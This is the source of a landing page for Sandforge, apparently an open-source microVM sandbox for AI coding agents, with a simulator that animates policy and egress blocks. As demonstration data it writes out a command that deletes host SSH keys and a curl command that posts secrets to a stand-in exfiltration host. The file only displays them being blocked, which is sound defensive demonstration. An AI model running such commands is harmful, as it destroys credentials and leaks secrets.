import React, { useState } from 'react';
import useDocusaurusContext from '@docusaurus/useDocusaurusContext';
import Layout from '@theme/Layout';
import Link from '@docusaurus/Link';
import DocCard from '../components/DocCard';

type CommandOption = 'test' | 'malware' | 'leak' | 'custom';

export default function Home(): React.JSX.Element {
  const { siteConfig } = useDocusaurusContext();
  
  // Interactive simulator states
  const [selectedCmd, setSelectedCmd] = useState<CommandOption>('test');
  const [customCmd, setCustomCmd] = useState<string>('python3 script.py');
  const [simulating, setSimulating] = useState<boolean>(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [simState, setSimState] = useState<'idle' | 'policy' | 'boot' | 'vsock' | 'run' | 'cleanup' | 'alert'>('idle');
  const [vmCpu, setVmCpu] = useState<number>(0);
  const [vmRam, setVmRam] = useState<number>(0);
  const [networkAlert, setNetworkAlert] = useState<boolean>(false);
  const [sysLog, setSysLog] = useState<string>('SYSTEM READY. GUEST KERNEL: CACHED');

  const runSimulation = () => {
    if (simulating) return;
    setSimulating(true);
    setLogs([]);
    setNetworkAlert(false);
    setVmCpu(0);
    setVmRam(0);

    const targetCmd = selectedCmd === 'custom' ? customCmd : 
                      selectedCmd === 'test' ? 'go test ./internal/policy/...' : 
                      selectedCmd === 'malware' ? 'rm -rf /host/Users/.ssh' : 
                      'curl -d "keys" https://exfiltrate-secrets.com';

    let steps: { text: string; delay: number; action?: () => void }[] = [];

    // Stage 1: Policy Engine
    steps.push({ text: `[POLICY] Intercepting request: Run "${targetCmd}"`, delay: 100 });
    steps.push({ text: `[POLICY] Resolving symbolic links...`, delay: 400 });
    
    if (selectedCmd === 'malware') {
      steps.push({ text: `[POLICY] SYMLINK DETECTED: Path maps physically to host /Users/anurag/.ssh`, delay: 800 });
      steps.push({ text: `[POLICY] CRITICAL ERROR: File write attempt to blocked host path. Violates policy rules.`, delay: 1200 });
      steps.push({ text: `[SYSTEM] CONTAINMENT TRIGGERED: Terminating transaction instantly.`, delay: 1600, action: () => {
        setSimState('alert');
        setSysLog('VIOLATION ALERT: UNSAFE WRITE INTERCEPTED');
      }});
      executeSteps(steps);
      return;
    }

    if (selectedCmd === 'leak') {
      steps.push({ text: `[POLICY] Inspecting network egress bounds...`, delay: 600 });
      steps.push({ text: `[POLICY] Warning: Egress mode set to "offline" for task runtime.`, delay: 1000 });
    }

    steps.push({ text: `[POLICY] Integrity checked. Cryptographic signature generated: sf_sig_99a8b8f72c`, delay: 1200, action: () => {
      setSimState('policy');
    }});

    // Stage 2: Boot Hypervisor
    steps.push({ text: `[SUPERVISOR] Provisioning guest microVM (VZ Engine macOS/Linux)...`, delay: 1800, action: () => {
      setSimState('boot');
      setVmCpu(2);
      setVmRam(2048);
      setSysLog('VM BOOT SEQUENCE STARTED');
    }});
    steps.push({ text: `[SUPERVISOR] Mapping guest Linux kernel: vmlinuz-guest-latest`, delay: 2100 });
    steps.push({ text: `[SUPERVISOR] Mapping guest RAM disk: initrd-guest-latest.img`, delay: 2300 });
    steps.push({ text: `[HYPERVISOR] Guest kernel BOOT COMPLETE in 218ms.`, delay: 2600, action: () => {
      setSysLog('GUEST LINUX KERNEL ACTIVE');
    }});

    // Stage 3: VSOCK Bridge
    steps.push({ text: `[SUPERVISOR] Dialing Virtual Socket bridge (VSOCK) port 2222...`, delay: 2900, action: () => {
      setSimState('vsock');
    }});
    steps.push({ text: `[VSOCK] Handshake established. Host-Guest communication channel secure.`, delay: 3300 });

    // Stage 4: Run Task inside rootless VM container
    steps.push({ text: `[GUEST] VSOCK Listener received envelope: exec(command: "${targetCmd}")`, delay: 3700, action: () => {
      setSimState('run');
    }});
    steps.push({ text: `[GUEST] Spawning rootless task container context...`, delay: 4100 });
    
    if (selectedCmd === 'leak') {
      steps.push({ text: `[GUEST] Running command: ${targetCmd}`, delay: 4500 });
      steps.push({ text: `[GUEST-NET] Blocked socket connection attempt to "exfiltrate-secrets.com" on port 443`, delay: 5000, action: () => {
        setNetworkAlert(true);
        setSysLog('EGRESS BLOCKED BY GUEST FIREWALL');
      }});
      steps.push({ text: `[GUEST] Result: Connection timed out. Exit code: 1`, delay: 5500 });
    } else {
      steps.push({ text: `[GUEST] Running command: ${targetCmd}`, delay: 4500 });
      steps.push({ text: `[GUEST] stdout: PASS - internal/policy/engine_test.go (0.12s)`, delay: 5000 });
      steps.push({ text: `[GUEST] stdout: OK. 14 test cases verified inside microVM.`, delay: 5300 });
      steps.push({ text: `[GUEST] Result: Exit code 0`, delay: 5600 });
    }

    // Stage 5: Clean Teardown
    steps.push({ text: `[SUPERVISOR] Task finished. Requesting hypervisor termination...`, delay: 6200, action: () => {
      setSimState('cleanup');
      setSysLog('RECLAIMING SYSTEM ALLOCATIONS');
    }});
    steps.push({ text: `[HYPERVISOR] Destroying microVM memory mapping contexts...`, delay: 6600, action: () => {
      setVmCpu(0);
      setVmRam(0);
      setNetworkAlert(false);
    }});
    steps.push({ text: `[SYSTEM] Reclaimed 2 vCPUs and 2048MB RAM host resources. Cleanup successful.`, delay: 7200, action: () => {
      setSimState('idle');
      setSimulating(false);
      setSysLog('SYSTEM READY. GUEST KERNEL: CACHED');
    }});

    executeSteps(steps);
  };

  const executeSteps = (steps: { text: string; delay: number; action?: () => void }[]) => {
    steps.forEach((step) => {
      setTimeout(() => {
        setLogs((prev) => [...prev, step.text]);
        if (step.action) step.action();
      }, step.delay);
    });
  };

  return (
    <Layout
      title="Sandforge | Secure Hypervisor-Level Sandbox"
      description="Isolated, sub-second microVM task container runtime for AI coding agents."
    >
      {/* Cyber Hero Container */}
      <section className="relative overflow-hidden bg-[#09090b] bg-sandbox-grid border-b border-zinc-800/80 py-24 scanlines">
        {/* Stealth white glowing grids */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-zinc-400/5 rounded-full blur-[140px] pointer-events-none glow-spot" />
        <div className="absolute top-10 right-10 w-96 h-96 bg-zinc-650/5 rounded-full blur-[100px] pointer-events-none" />

        <div className="max-w-7xl mx-auto px-6 lg:px-8 relative z-20">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
            
            {/* Left side: Technical Pitch */}
            <div className="lg:col-span-6 text-left">
              <span className="inline-flex items-center gap-1.5 px-3 py-1 text-xs font-mono font-semibold text-zinc-300 bg-zinc-900/40 rounded border border-zinc-800 mb-6 uppercase tracking-wider">
                <span className="w-2 h-2 bg-white rounded-full animate-ping" />
                HYPERVISOR CONTAINMENT PROTOCOL ACTIVE
              </span>
              
              <h1 className="text-4xl sm:text-5xl font-extrabold tracking-tight font-heading text-white leading-none mb-6">
                Hardened Isolation<br />
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-zinc-100 via-zinc-300 to-zinc-400">
                  For Coding Agents.
                </span>
              </h1>
              
              <p className="text-base text-zinc-400 leading-relaxed font-sans max-w-lg mb-8">
                Autonomous LLMs write and execute raw commands. Stop running them in host-shared Docker containers. Sandforge boots ephemeral, dedicated guest kernels in under **250ms**, completely decoupling untrusted process runtimes from host hardware.
              </p>

              {/* Secure Systems Stats Matrix */}
              <div className="grid grid-cols-2 gap-4 mb-8 max-w-md font-mono text-xs">
                <div className="p-3 bg-zinc-950/60 border border-zinc-850 rounded flex flex-col">
                  <span className="text-zinc-500 uppercase tracking-widest text-[9px]">containment</span>
                  <span className="text-zinc-200 font-bold mt-1">Apple VZ / Linux KVM</span>
                </div>
                <div className="p-3 bg-zinc-950/60 border border-zinc-850 rounded flex flex-col">
                  <span className="text-zinc-500 uppercase tracking-widest text-[9px]">communication</span>
                  <span className="text-zinc-200 font-bold mt-1">Hardware VSOCK v2222</span>
                </div>
                <div className="p-3 bg-zinc-950/60 border border-zinc-850 rounded flex flex-col">
                  <span className="text-zinc-500 uppercase tracking-widest text-[9px]">network policy</span>
                  <span className="text-zinc-200 font-bold mt-1">Deny-by-Default Egress</span>
                </div>
                <div className="p-3 bg-zinc-950/60 border border-zinc-850 rounded flex flex-col">
                  <span className="text-zinc-500 uppercase tracking-widest text-[9px]">boot latency</span>
                  <span className="text-zinc-200 font-bold mt-1">&lt; 250 milliseconds</span>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row items-center gap-4">
                <Link
                  to="/docs/intro"
                  className="w-full sm:w-auto px-6 py-3 bg-white hover:bg-zinc-200 text-zinc-950 font-bold rounded shadow transition-all font-mono text-sm text-center border border-zinc-300 no-underline hover:no-underline"
                >
                  INITIALIZE SYSTEM
                </Link>
                <Link
                  to="/docs/architecture"
                  className="w-full sm:w-auto px-6 py-3 bg-zinc-950 border border-zinc-800 hover:border-zinc-450 text-zinc-300 font-semibold font-mono text-sm rounded transition-all text-center no-underline hover:no-underline"
                >
                  SYSTEM CORE ARCH
                </Link>
              </div>
            </div>

            {/* Right side: Interactive Containment Simulator */}
            <div className="lg:col-span-6 w-full">
              <div className="sandbox-frame cyber-corners">
                
                {/* Simulator Header */}
                <div className="flex items-center justify-between px-6 py-3 border-b border-zinc-800 bg-zinc-950/60">
                  <div className="flex items-center gap-3">
                    <span className={`w-2.5 h-2.5 rounded-full ${simulating ? 'bg-amber-500 animate-pulse' : 'bg-zinc-200'}`} />
                    <span className="text-xs font-mono text-zinc-300 font-bold">HYPERVISOR_MONITOR.SH</span>
                  </div>
                  <span className="text-[10px] font-mono text-zinc-500 uppercase">secure containment v1.0.0</span>
                </div>

                {/* Simulator dashboard details */}
                <div className="p-6 border-b border-zinc-850 bg-[#121214] grid grid-cols-3 gap-4 font-mono text-xs text-zinc-400">
                  <div>
                    <span className="text-[9px] uppercase tracking-widest text-zinc-500 block">vCPU Limit</span>
                    <div className="flex items-center gap-2 mt-1">
                      <div className="flex-1 bg-zinc-950 h-2.5 rounded overflow-hidden border border-zinc-800">
                        <div 
                          className="bg-zinc-200 h-full transition-all duration-300" 
                          style={{ width: `${(vmCpu / 2) * 100}%` }}
                        />
                      </div>
                      <span className="text-[10px] text-zinc-200 font-bold">{vmCpu}/2</span>
                    </div>
                  </div>

                  <div>
                    <span className="text-[9px] uppercase tracking-widest text-zinc-500 block">RAM alloc</span>
                    <div className="flex items-center gap-2 mt-1">
                      <div className="flex-1 bg-zinc-950 h-2.5 rounded overflow-hidden border border-zinc-800">
                        <div 
                          className="bg-zinc-200 h-full transition-all duration-300" 
                          style={{ width: `${(vmRam / 2048) * 100}%` }}
                        />
                      </div>
                      <span className="text-[10px] text-zinc-200 font-bold">{vmRam}MB</span>
                    </div>
                  </div>

                  <div>
                    <span className="text-[9px] uppercase tracking-widest text-zinc-500 block">System Lock</span>
                    <span className={`inline-block mt-1 font-bold text-[10px] px-2 py-0.5 rounded ${
                      simState === 'alert' ? 'bg-red-950/40 text-red-400 border border-red-800' : 'bg-zinc-800/40 text-zinc-200 border border-zinc-700'
                    }`}>
                      {simState === 'alert' ? 'VIOLATION DETECTED' : 'ENVELOPE SECURE'}
                    </span>
                  </div>
                </div>

                {/* Simulated command console inputs */}
                <div className="p-6 bg-[#0e0e10] border-b border-zinc-850">
                  <span className="text-xs font-mono font-semibold text-zinc-300 block mb-3">SELECT SANDBOX COMMAND EXPERIMENT:</span>
                  
                  <div className="grid grid-cols-3 gap-3 mb-4 font-mono text-[10px]">
                    <button
                      disabled={simulating}
                      onClick={() => setSelectedCmd('test')}
                      className={`p-2 rounded text-left border cursor-pointer transition-all ${
                        selectedCmd === 'test' 
                          ? 'bg-zinc-800/40 text-white border-zinc-500' 
                          : 'bg-zinc-950/40 text-zinc-400 border-zinc-900 hover:border-zinc-800'
                      }`}
                    >
                      🧪 Run Test Suite
                    </button>
                    <button
                      disabled={simulating}
                      onClick={() => setSelectedCmd('malware')}
                      className={`p-2 rounded text-left border cursor-pointer transition-all ${
                        selectedCmd === 'malware' 
                          ? 'bg-red-950/20 text-red-400 border-red-500' 
                          : 'bg-zinc-950/40 text-zinc-400 border-zinc-900 hover:border-zinc-800'
                      }`}
                    >
                      ☠️ Write to SSH keys
                    </button>
                    <button
                      disabled={simulating}
                      onClick={() => setSelectedCmd('leak')}
                      className={`p-2 rounded text-left border cursor-pointer transition-all ${
                        selectedCmd === 'leak' 
                          ? 'bg-amber-950/20 text-amber-400 border-amber-500' 
                          : 'bg-zinc-950/40 text-zinc-400 border-zinc-900 hover:border-zinc-800'
                      }`}
                    >
                      📡 Data Exfiltration
                    </button>
                  </div>

                  <div className="flex gap-3">
                    <div className="flex-1 font-mono text-xs text-zinc-400 flex items-center bg-[#070708] border border-zinc-800 px-3 py-2 rounded">
                      <span className="text-zinc-500 mr-2">$</span>
                      {selectedCmd === 'test' && <code>go test ./internal/policy/...</code>}
                      {selectedCmd === 'malware' && <code className="text-red-400">rm -rf /host/Users/.ssh</code>}
                      {selectedCmd === 'leak' && <code className="text-amber-400">curl -d "keys" https://exfiltrate-secrets.com</code>}
                    </div>
                    <button
                      onClick={runSimulation}
                      disabled={simulating}
                      className="px-4 py-2 bg-white hover:bg-zinc-200 disabled:bg-zinc-900 disabled:border-zinc-800 border border-zinc-300 text-zinc-950 font-bold font-mono text-xs rounded transition-all cursor-pointer"
                    >
                      {simulating ? 'RUNNING...' : 'BOOT & EXECUTE'}
                    </button>
                  </div>
                </div>

                {/* Real-time terminal log viewer */}
                <div className="p-6 bg-[#050506] font-mono text-xs min-h-[190px] max-h-[190px] overflow-y-auto text-left flex flex-col gap-1 border-b border-zinc-850">
                  {logs.length === 0 ? (
                    <div className="text-zinc-500/40 flex flex-col gap-1">
                      <span>CONSOLE STANDBY. WAIT FOR INSTRUCTION ALLOCATION.</span>
                      <span>SELECT COMMAND ABOVE AND CLICK "BOOT & EXECUTE".</span>
                    </div>
                  ) : (
                    logs.map((log, idx) => (
                      <span key={idx} className={
                        log.includes('CRITICAL') || log.includes('VIOLATION') || log.includes('ERROR') ? 'text-red-400' :
                        log.includes('Blocked') || log.includes('Warning') ? 'text-amber-400' :
                        log.includes('PASS') || log.includes('OK') ? 'text-zinc-200 font-bold' :
                        log.includes('[POLICY]') ? 'text-zinc-400' :
                        log.includes('[SUPERVISOR]') ? 'text-zinc-300' : 'text-zinc-400'
                      }>
                        {log}
                      </span>
                    ))
                  )}
                </div>

                {/* Simulated hardware state footer */}
                <div className="px-6 py-3.5 bg-zinc-950/60 font-mono text-[9px] flex justify-between items-center text-zinc-500">
                  <div className="flex items-center gap-1.5">
                    <span className={`w-1.5 h-1.5 rounded-full ${simulating ? 'bg-amber-500 animate-ping' : 'bg-zinc-400'}`} />
                    <span>STATUS: {sysLog}</span>
                  </div>
                  {networkAlert && (
                    <span className="text-red-400 font-bold animate-pulse">!! EGRESS BLOCK MATCH !!</span>
                  )}
                </div>

              </div>
            </div>

          </div>
        </div>
      </section>

      {/* Structured Technical Documentation Cards Grid */}
      <section className="py-24 bg-[#09090b] border-b border-zinc-800/40 relative">
        <div className="absolute inset-0 bg-sandbox-grid opacity-30 pointer-events-none" />
        <div className="max-w-7xl mx-auto px-6 lg:px-8 relative z-20">
          
          <div className="text-center max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-extrabold font-heading text-white">
              System Operations & Integration Guide
            </h2>
            <p className="mt-4 text-zinc-400 font-sans text-sm">
              Read low-level architectural breakdowns, configure path sandbox boundaries, and integrate SDKs.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <DocCard
              title="System Architecture"
              description="Learn about the separate control and execution planes, trust boundaries, and VSOCK wire formatting."
              href="/docs/architecture"
              icon="🏗️"
              badge="Architecture"
            />
            <DocCard
              title="The Policy Engine"
              description="How Sandforge performs symlink evaluating path checks and whitelist filters prior to execution allocation."
              href="/docs/policy-engine"
              icon="🛡️"
              badge="Security"
            />
            <DocCard
              title="macOS Hypervisor"
              description="Configure low-level Apple Virtualization bootloaders, directory mounts, and serial consoles."
              href="/docs/macos-driver"
              icon="🍏"
              badge="VZ Driver"
            />
            <DocCard
              title="Advanced Cache Guides"
              description="Persist compiler build archives (GOCACHE, npm modules) between runs inside ephemeral sandboxes."
              href="/docs/guides"
              icon="⚡"
              badge="Performance"
            />
          </div>
        </div>
      </section>

      {/* Low-Level VM Payload Walkthrough Section */}
      <section className="py-24 bg-[#121214] border-b border-zinc-800/40 relative">
        <div className="max-w-7xl mx-auto px-6 lg:px-8 relative z-20">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
            
            {/* Explanatory text */}
            <div className="lg:col-span-5 text-left font-sans">
              <h2 className="text-3xl font-bold font-heading text-white mb-6">
                Secure Hardware VSOCK Handshaking
              </h2>
              <p className="text-zinc-400 text-sm leading-relaxed mb-6">
                Sandboxes are fully isolated network-offline environments. Host-Guest communication is established exclusively over **Virtual Sockets (VSOCK)**, operating direct physical transfers across the hypervisor bus.
              </p>
              
              <div className="flex flex-col gap-4 font-mono text-xs text-zinc-500">
                <div className="flex items-start gap-3">
                  <span className="text-zinc-300 font-bold font-mono">01/</span>
                  <span>Payload messages are encoded as length-prefixed JSON envelopes</span>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-zinc-300 font-bold font-mono">02/</span>
                  <span>Egress network streams are dropped at the host hypervisor level</span>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-zinc-300 font-bold font-mono">03/</span>
                  <span>Task limits are strictly enforced on guest kernels to prevent DoS</span>
                </div>
              </div>
            </div>

            {/* Hardware JSON Protocol Visualizer */}
            <div className="lg:col-span-7 w-full">
              <div className="sandbox-frame">
                <div className="flex items-center justify-between px-6 py-2.5 border-b border-zinc-800 bg-zinc-950/60 font-mono text-[10px] text-zinc-400">
                  <span>VSOCK WIRE FORMAT ENVELOPE</span>
                  <span className="text-zinc-300">json</span>
                </div>
                <div className="p-6 font-mono text-xs text-slate-300 leading-relaxed overflow-x-auto bg-[#030303]">
                  <pre className="m-0 bg-transparent text-zinc-350">
{`{
  "op": "exec",
  "payload": {
    "command": ["go", "test", "./..."],
    "cwd": "/workspace",
    "env": {
      "GOOS": "linux",
      "CGO_ENABLED": "0"
    },
    "timeout_sec": 30
  }
}`}
                  </pre>
                </div>
              </div>
            </div>

          </div>
        </div>
      </section>

      {/* Command Line Tooling Block */}
      <section className="py-24 bg-[#09090b] relative">
        <div className="absolute inset-0 bg-sandbox-grid opacity-25 pointer-events-none" />
        <div className="max-w-7xl mx-auto px-6 lg:px-8 relative z-20 text-center">
          <h2 className="text-3xl font-extrabold font-heading text-white mb-4">
            Hardened Hypervisor Core. Ready for Scaling.
          </h2>
          <p className="max-w-xl mx-auto text-zinc-400 font-sans text-sm mb-8 leading-relaxed">
            Sandforge is entirely open-source, written in idiomatic Go, and custom-tuned for zero-trust autonomous agent execution.
          </p>
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <Link
              to="/docs/intro"
              className="w-full sm:w-auto px-8 py-3.5 bg-white hover:bg-zinc-200 text-zinc-950 font-bold rounded shadow transition-all font-mono text-sm border border-zinc-300 no-underline hover:no-underline"
            >
              BOOT STRAP SYSTEM
            </Link>
            <a
              href="https://github.com/yanurag-dev/sandforge"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full sm:w-auto px-8 py-3.5 bg-zinc-950 hover:border-zinc-800 text-zinc-300 font-semibold font-mono text-sm rounded border border-zinc-800/60 shadow transition-all no-underline hover:no-underline"
            >
              INSPECT HOST SOURCE
            </a>
          </div>
        </div>
      </section>
    </Layout>
  );
}
